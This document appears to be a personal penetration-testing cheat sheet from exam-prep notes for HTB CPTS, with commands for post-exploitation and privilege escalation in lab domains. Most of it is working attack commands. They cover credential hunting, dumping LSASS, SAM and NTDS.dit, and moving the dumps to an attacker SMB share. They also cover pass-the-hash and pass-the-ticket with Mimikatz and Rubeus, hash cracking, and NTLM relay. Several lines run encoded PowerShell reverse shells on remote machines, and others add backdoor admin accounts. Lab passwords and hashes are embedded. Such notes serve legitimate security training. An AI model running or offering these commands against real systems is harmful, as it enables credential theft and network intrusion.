<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--command-to-further-search-for-userpasswordpass"></a>

#### Command to further search for user,password,pass
```shell
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--command-to-search-for-databases"></a>

#### Command to search for Databases
```shell
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--command-to-search-for-txt-files"></a>

#### Command to search for txt files
```shell
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--command-to-search-for-scripts"></a>

#### Command to search for scripts
```shell
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

---

<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--looking-at-history"></a>

### Looking at history

```shell
history

tail -n5 /home/*/.bash*
```

---

<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--looking-through-log-files"></a>

### Looking through log files

```shell
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

---
<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--memory-and-cache"></a>

### Memory and Cache

<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--mimipenguin"></a>

##### Mimipenguin
```shell
sudo python3 mimipenguin.py
sudo bash mimipenguin.sh 
```

- located in cpts-tools

<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--lazagne"></a>

##### LaZagne
```shell
sudo python2.7 laZagne.py all
```

---

<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--browsers"></a>

### Browsers

```shell
ls -l .mozilla/firefox/ | grep default 

cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```
<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--firefox_decryptpy"></a>

###### Firefox_decrypt.py
```shell
vernonlim03@htb[/htb]$ python3.9 firefox_decrypt.py
```
- in cpts-tools

<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--lazagne_1"></a>

###### LaZagne
```shell
python3 laZagne.py browsers
```

---

<a id="cpts-post-exploits-linux-credential-hunting-a70f40cf--linikatz"></a>

### Linikatz

```
./linikatz
```


---

<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa"></a>

<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--pass-the-ticket-ptt"></a>

# Pass the Ticket (PtT)


<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--identify-if-linux-machine-is-joined-to-ad"></a>

### Identify if linux machine is joined to AD
```
realm list
```
(should be installed in the system)

<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--if-not-installed-look-for-these-processes"></a>

##### If not installed look for these processes
```shell
david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"

root        2140       1  0 Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files
root        2141    2140  0 Sep29 ?        00:00:08 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid 0 --gid 0 --logger=files
root        2142    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
root        2143    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files
```
(if present it means it is joined to active directory)


<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--find-keytab-files"></a>

### Find keytab files
```shell
find / -name *keytab* -ls 2>/dev/null
```

```shell
crontab -l
```
(look out for kinit)

<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--finding-ccache-files"></a>

### Finding ccache Files
```shell
env | grep -i krb5
```
```
ls -la /tmp
```


<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--importing-ccache-file-into-current-session"></a>

### Importing ccache File into current session
```shell
klist
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist
```

<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--listing-keytab-file-information"></a>

### Listing keytab file information

```shell
klist -k -t /opt/specialfiles/carlos.keytab 
```


<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--impersonating-user-with-a-keytab"></a>

### Impersonating user with a keytab

```shell
klist 
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist 
```


<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--extracting-keytab-hashes-with-keytabextract"></a>

### Extracting keytab hashes with KeyTabExtract
```shell
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```
(can further use the ntlm hash to do PTH attack or crack it)


<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--how-to-escalate"></a>

### How to escalate
- crack key and ssh in
- relay the hash
- use id command to check for group memberships


<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--evil-winrm-on-kali"></a>

### Evil-WinRM on Kali

```shell
sudo apt-get install krb5-user -y

proxychains evil-winrm -i dc01 -r inlanefreight.htb
```
(run first time setup first if not modify the /etc/krb5.conf file)


<a id="cpts-post-exploits-linux-pass-the-ticket-ptt-5b0106aa--check-sudo-rights"></a>

### Check sudo rights 
```
sudo -l
```


---

<a id="cpts-post-exploits-windows-dcom-f7ad3a18"></a>

<a id="cpts-post-exploits-windows-dcom-f7ad3a18--dcom"></a>

# DCOM


Execute both of this to gain back a reverse shell
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```
![Pasted image 20250606202144.png](cpts/assets/Pasted%20image%2020250606202144.png)



---

<a id="cpts-post-exploits-windows-dumping-out-credman-2c400c4d"></a>

<a id="cpts-post-exploits-windows-dumping-out-credman-2c400c4d--dumping-out-credman"></a>

# Dumping out CredMan

```cmd
C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr
```

<a id="cpts-post-exploits-windows-dumping-out-credman-2c400c4d--enumerate-credentials-using-cmdkey"></a>

#### Enumerate Credentials using cmdkey
```cmd
C:\Users\sadams>cmdkey /list
```



<a id="cpts-post-exploits-windows-dumping-out-credman-2c400c4d--run-cmd-as-credman-stored-user-eg-domain-user"></a>

##### Run cmd as CredMan stored user (Eg domain user)
![Pasted image 20250813102140.png](cpts/assets/Pasted%20image%2020250813102140.png)
```cmd
C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
```


<a id="cpts-post-exploits-windows-dumping-out-credman-2c400c4d--use-mimikatz"></a>

## Use mimikatz


---

<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd"></a>

<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd--dumping-out-lsass"></a>

# Dumping out LSASS


---
<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd--task-manager-method"></a>

### Task manager method
(You need access to rdp and then task manager for this)

Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file
![Pasted image 20250429093148.png](cpts/assets/Pasted%20image%2020250429093148.png)

File will be saved in this directory
```cmd
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

- Use impacket-smbserver to transfer the file

---

<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd--rundll32exe-comsvcsdll-method"></a>

### Rundll32.exe & Comsvcs.dll Method

<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd--finding-lsass-pid-in-cmd"></a>

##### Finding LSASS PID in cmd
```cmd
C:\Windows\system32> tasklist /svc
```

<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd--finding-lsass-pid-in-powershell"></a>

##### Finding LSASS PID in PowerShell
```powershell
PS C:\Windows\system32> Get-Process lsass
```

<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd--creating-lsassdmp-using-powershell"></a>

##### Creating lsass.dmp using PowerShell
```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

- Use impacket-smbserver to transfer the file

---
<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd--pypykatz"></a>

### Pypykatz
(make sure to transfer the lsass.dmp file over to our attack host)

```shell
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```

---
<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd--cracking-the-nt-hash"></a>

##### Cracking the NT Hash
```shell
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

---
<a id="cpts-post-exploits-windows-dumping-out-lsass-3b7b98dd--mimikatz"></a>

### Mimikatz

```bash
./mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

If the above fails due to it being encrypted, we can try a diff approach and wait for the targeted user to lock in

```bash
./mimikatz.exe
privilege::debug
misc::memssp
```
(after this is done just pray we get a login)

Credentials will then be saved in this logfile
```bash
type C:\Windows\System32\mimilsa.log
```


---

<a id="cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253"></a>

<a id="cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253--dumping-out-ntdsdit"></a>

# Dumping out NTDS.dit

This file is typically stored on the domain controller and houses all domain usernames and passwords and hashes.

---
<a id="cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253--connect-to-the-dc-with-evil-winrm"></a>

##### Connect to the DC with Evil-WinRM
```shell
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

<a id="cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253--create-shadow-copy-of-c-drive"></a>

##### Create shadow copy of C drive
```evil-winrm
vssadmin CREATE SHADOW /For=C:
```

<a id="cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253--copy-ntdsdit-from-the-vss"></a>

##### Copy NTDS.dit from the VSS
```evil-winrm
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

<a id="cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253--copy-over-using-impacket-smbserver"></a>

##### Copy over using impacket smbserver
```evil-winrm
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
```

---

<a id="cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253--using-netexec-to-dump-ntds"></a>

### Using Netexec to dump ntds
```shell
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

---

<a id="cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253--cracking-the-hashes-obtained"></a>

### Cracking the hashes obtained

```shell
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

---

<a id="cpts-post-exploits-windows-dumping-out-ntds-dit-ad0fd253--pass-the-hash-attack"></a>

### Pass-the-Hash attack

```shell
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```


---

<a id="cpts-post-exploits-windows-dumping-out-sam-8475da60"></a>

<a id="cpts-post-exploits-windows-dumping-out-sam-8475da60--dumping-out-sam"></a>

# Dumping out SAM


<a id="cpts-post-exploits-windows-dumping-out-sam-8475da60--sam-registries"></a>

### SAM registries

<a id="cpts-post-exploits-windows-dumping-out-sam-8475da60--use-administrator-cmd-to-run-regexe"></a>

##### Use Administrator cmd to run reg.exe
```cmd
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
```

<a id="cpts-post-exploits-windows-dumping-out-sam-8475da60--use-impacket-smbserver-to-receive-the-files-on-host"></a>

##### Use impacket-smbserver to receive the files on host
```shell
vernonlim03@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /tmp
```

```cmd
C:\> move sam.save \\10.10.15.16\CompData
C:\> move security.save \\10.10.15.16\CompData
C:\> move system.save \\10.10.15.16\CompData
```

<a id="cpts-post-exploits-windows-dumping-out-sam-8475da60--convert-to-readable-format-using-secretsdump"></a>

##### Convert to readable format using secretsdump

```shell
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

---
<a id="cpts-post-exploits-windows-dumping-out-sam-8475da60--use-secretsdumppy-to-simplify-the-process"></a>

#### Use secretsdump.py to simplify the process
- needs to have administrator compromised in order to dump out

```shell
secretsdump.py bob:'HTB_@cademy_stdnt!'@10.129.202.137
```

Subsequently just use hashcat to crack the sam hashes obtained

```shell
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

---
<a id="cpts-post-exploits-windows-dumping-out-sam-8475da60--crackmapexecnetexec"></a>

#### Crackmapexec/Netexec

```shell-session
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

---

<a id="cpts-post-exploits-windows-dumping-out-sam-8475da60--mimikatz"></a>

#### Mimikatz

```powershell
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
sekurlsa::logonpasswords
```


---

<a id="cpts-post-exploits-windows-invoke-runascs-82bcc924"></a>

<a id="cpts-post-exploits-windows-invoke-runascs-82bcc924--invoke-runascs"></a>

# Invoke-RunasCs

Useful for lateral movement to change user account

```
Import-Module .\Invoke-RunasCs.ps1
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
```



---

<a id="cpts-post-exploits-windows-ntlmv2-relay-1a9fa4cb"></a>

<a id="cpts-post-exploits-windows-ntlmv2-relay-1a9fa4cb--ntlmv2-relay"></a>

# NTLMv2 Relay


DK if this is allowed or useful in the exam but i shall just put it here in case it comes in handy

---

Run this command to start the ntlmrelayx server targetting 192.168.50.212
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
```
(rmb to edit the powershell command to execute the rev shell to our target host)

Start the netcat listener next
```bash
rlwrap nc -lnvp 4444
```

Then do whatever it takes to get the desired user and machine to point to our attack host ip using 
```
dir \\192.168.45.235\test
```


---

<a id="cpts-post-exploits-windows-overpass-the-hash-9f40f285"></a>

<a id="cpts-post-exploits-windows-overpass-the-hash-9f40f285--overpass-the-hash"></a>

# Overpass the Hash

basically pass the hash but instead of directly passing the hash we are creating a kerberos ticket out of the hash then passing that kerberos ticket

```mimikatz
privilege::debug
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

Check for the cached ticket
```powershell
klist
net use \\files04 #connect to a diff ip
klist
```

Use psexec to gain shell access on another machine
```powershell
.\PsExec.exe \\files04 cmd
```


---

<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5"></a>

<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--pass-the-hash"></a>

# Pass the Hash

If we obtain a crackable or not ntlm hash, we can always pass it around


<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--mimikatz"></a>

### Mimikatz
```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
(this will spawn another cmd.exe session and it will be the new user)


<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--powershell-invoke-thehash"></a>

### Powershell Invoke-TheHash
(Suite of invoke can be found in cpts-tools)

```powershell
PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```
(can also insert in a powershell reverse shell script in the -Command)


<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--impacket-psexec"></a>

### Impacket-psexec
```shell
psexec.py administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```


<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--impacket-wmiexec"></a>

### Impacket-wmiexec
```bash
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--netexec"></a>

### Netexec
```shell
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```


<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--evil-winrm"></a>

### Evil-WinRM
```shell
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```


<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--xfreerdp"></a>

### XfreeRDP
```shell
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

- This will only work if the particular setting enabling restricted admin mode is turned on 
```
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```


<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--smbclient"></a>

### SMBClient
```bash
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

<a id="cpts-post-exploits-windows-pass-the-hash-b577bda5--notes-for-pth-attack"></a>

# Notes for PTH Attack

UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.
```
Note: There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.
```




---

<a id="cpts-post-exploits-windows-pass-the-ticket-ptt-22d39f78"></a>

<a id="cpts-post-exploits-windows-pass-the-ticket-ptt-22d39f78--pass-the-ticket-ptt"></a>

# Pass the Ticket (PtT)


As much as possible execute all tools in administrator cmd

---
<a id="cpts-post-exploits-windows-pass-the-ticket-ptt-22d39f78--mimikatz-export-tickets"></a>

### Mimikatz - Export Tickets

```cmd
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::tickets /export
```
Format of tickets
```

### Rubeus - Export Tickets

```cmd
Rubeus.exe dump /nowrap
```

---

### Mimikatz - Extract Kerberos keys
```cmd
c:\tools> mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::ekeys
```

### Mimikatz - Pass the key or OverPass the Hash
```cmd
c:\tools> mimikatz.exe
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
```

### Rubeus - Pass the key or OverPass the Hash

```cmd
c:\tools> Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```


To do a pass the key or overpass the hash, mimikatz requires admin cmd whereas rubeus doesn't, so can fetch rc4 aes ntlm keys using mimikatz and then use rubeus

---

### Rubeus Pass the Ticket
```cmd
c:\tools> Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```
```cmd
c:\tools> Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```

###### Base 64 PTT
```cmd-session
c:\tools> Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/
```


---

### Mimikatz - Pass the Ticket

```cmd
C:\tools> mimikatz.exe 
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
* File: 'C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi': OK
mimikatz # exit
```

---

### Mimikatz - Powershell Remoting with PTT

```cmd
C:\tools> mimikatz.exe
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

* File: 'C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK

mimikatz # exit
Bye!

c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
```

### Rubeus - Powershell Remoting with PTT

```cmd
C:\tools> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

C:\tools> Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```


---

<a id="cpts-post-exploits-windows-psexec-54de10de"></a>

<a id="cpts-post-exploits-windows-psexec-54de10de--psexec"></a>

# Psexec

- account needs to be part of local administrators group
- admin$ share must be available  (on by default)
- file and printer sharing must be turned on  (on by default)

```powershell
.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```

```bash
impacket-psexec <domain>/<username>:<password>@<vicitm ip>
impacket-psexec corp/jen:'Nexus123!'@192.168.137.72

psexec.py <username>@<ip> -hashes <NTLM Hash>
psexec.py administrator@192.168.183.134 -hashes 
aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd14483198ac04f
```


---

<a id="cpts-post-exploits-windows-searching-for-traces-30841cff"></a>

<a id="cpts-post-exploits-windows-searching-for-traces-30841cff--searching-for-traces"></a>

# Searching for traces


<a id="cpts-post-exploits-windows-searching-for-traces-30841cff--keywords-to-search"></a>

#### Keywords to search
![Pasted image 20250429150028.png](cpts/assets/Pasted%20image%2020250429150028.png)

<a id="cpts-post-exploits-windows-searching-for-traces-30841cff--searching-tools"></a>

#### Searching Tools
- Windows search (GUI)
- Lazagne.exe
- findstr

<a id="cpts-post-exploits-windows-searching-for-traces-30841cff--lazagneexe"></a>

#### Lazagne.exe
Just copy the file over using rdp or any method then run it
```cmd
C:\Users\bob\Desktop> start lazagne.exe all
```

- exploit is located in cpts-tools
<a id="cpts-post-exploits-windows-searching-for-traces-30841cff--findstr"></a>

#### Findstr
```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```


---

<a id="cpts-post-exploits-windows-wmi-winrm-6f7840cf"></a>

<a id="cpts-post-exploits-windows-wmi-winrm-6f7840cf--wmi-winrm"></a>

# WMI & WinRM


Using wmic to spawn a process on another machine
```cmd
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

Using wmic on powershell
```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```



Using winrs to gain remote code execution
```cmd
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

Using winrs on powershell instead
```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
Enter-PSSession 1
```


---

<a id="cpts-privesc-path-83561099"></a>

<a id="cpts-privesc-path-83561099--path"></a>

# $PATH

Check for path

```bash
echo $PATH

(env || set) 2>/dev/null
```


---

<a id="cpts-privesc-ssh-keys-9d5895fc"></a>

<a id="cpts-privesc-ssh-keys-9d5895fc--ssh-keys"></a>

# SSH Keys




Check home directory of users using extended ls for .ssh directory and keys, remember to check the root directory as well
```bash
ls -al
```

If we are able to read the file, we can copy it over to our base kali and ssh into the server
```bash
vernonlim03@htb[/htb]$ vim id_rsa
vernonlim03@htb[/htb]$ chmod 600 id_rsa
vernonlim03@htb[/htb]$ ssh root@10.10.10.10 -i id_rsa

root@10.10.10.10#
```

<a id="cpts-privesc-ssh-keys-9d5895fc--create-new-ssh-keys"></a>

### Create new SSH Keys

Can be done if there is no ssh keys present in the user home directory

```bash
ssh-keygen -f key
```
(-f flag is to specifically output the file)


---

<a id="cpts-privesc-scripts-c4d7f139"></a>

<a id="cpts-privesc-scripts-c4d7f139--scripts"></a>

# Scripts

Linpeas
LinEnum
linuxprivchecker
linux-exploit-suggester

Winpeas
Seatbelt
Jaws


*Remember to store all these in OPT folder of base kali* abcd


---

<a id="cpts-privesc-service-binary-hijacking-macbook-pro-4551c4c6"></a>

<a id="cpts-privesc-service-binary-hijacking-macbook-pro-4551c4c6--service-binary-hijacking-macbook-pro"></a>

# Service Binary Hijacking-MacBook Pro


Get a list of all installed windows services
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Check permissions on a binary
```powershell
icacls "C:\xampp\apache\bin\httpd.exe"
```

Stopping a service
```powershell
net stop mysql
```

Check if service starts on boot
```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

#if the service is set to auto check privileges
whoami /priv

#if SeShutDownPrivilege
shutdown /r /t 0
```

Use PowerUp.ps1 to check for modifiable service files
```powershell
iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile

#if the file is directly abusable we can just run this
Install-ServiceBinary -Name 'mysql'
#this will create a user john:Password123! and add to local administrator group. However, do rememeber to further manually en
```


---

<a id="cpts-privesc-user-privileges-db86feff"></a>

<a id="cpts-privesc-user-privileges-db86feff--user-privileges"></a>

# User Privileges


Check for what sudo privileges we have
```bash
sudo -l
```

Check if we can change to root (if lucky)
```bash
sudo su -
```

Running sudo as another user
```bash
vernonlim03@htb[/htb]$ sudo -u user /bin/echo Hello World!

    Hello World!
```

Change user command
```bash
sudo -su user2
```

<a id="cpts-privesc-user-privileges-db86feff--gtfobins"></a>

#### GTFOBins

If there is a service that is capable of running as the root user, check GTFOBins for it
<https://gtfobins.github.io/>


<a id="cpts-privesc-user-privileges-db86feff--lolbas"></a>

#### LOLBAS

Contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user
<https://lolbas-project.github.io/#>


---

<a id="cpts-privesc-vulnerable-software-0b603bf7"></a>

<a id="cpts-privesc-vulnerable-software-0b603bf7--vulnerable-software"></a>

# Vulnerable Software

Look for software installed in the victim machine which could potentially be vulnerable

For Linux:
```bash
dpkg -l
```

For Windows:
```cmd
C:\Program Files
```



---

<a id="cpts-privesc-linux-crontabs-scheduled-tasks-ae8a4f87"></a>

